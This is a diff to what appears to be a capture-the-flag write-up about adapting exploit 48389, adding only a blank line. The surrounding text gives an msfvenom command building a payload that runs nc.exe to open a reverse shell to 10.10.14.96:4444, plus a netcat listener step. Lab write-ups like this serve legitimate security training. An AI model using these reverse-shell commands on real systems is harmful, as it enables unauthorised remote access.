@@ -46,6 +46,7 @@ Now we need to do some changes in our 48389 exploit , just copy the  output of t
 The metasploit payload : `msfvenom -p windows/exec  CMD=’c;\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.96 4444′ -b  ‘\x00\x0a\x0d’ -f py -v payload` 
 
 ![](12.png)
+
 *Now start a netcat listner as nc -lnvp 4444 and on the second terminal exeute the payload as follows :*
 
 ![](13.png)
